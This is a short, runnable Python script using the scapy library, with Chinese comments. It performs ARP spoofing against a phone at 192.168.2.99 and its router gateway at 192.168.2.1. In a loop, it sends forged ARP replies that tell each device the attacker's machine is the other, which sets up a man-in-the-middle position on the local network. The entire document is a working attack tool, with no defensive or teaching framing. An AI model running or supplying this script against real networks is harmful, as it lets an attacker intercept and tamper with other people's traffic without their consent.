import time
from scapy.all import ARP, send

# 手机的 IP 地址
target_ip = "192.168.2.99"    
# 路由器网关的 IP
gateway_ip = "192.168.2.1"     

def spoof(target_ip, spoof_ip):
    # 构造 ARP 应答包 (op=2)
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

try:
    print("[*] 开始进行 ARP 欺骗... 按 Ctrl+C 停止")
    while True:
        # 1. 欺骗手机：告诉手机“我是网关 (192.168.2.1)”
        spoof(target_ip, gateway_ip)
        
        # 2. 欺骗网关：告诉网关“我是手机 (192.168.2.99)”
        spoof(gateway_ip, target_ip)
        
        time.sleep(0.5)

except KeyboardInterrupt:
    print("\n[-] 停止欺骗，正在退出...")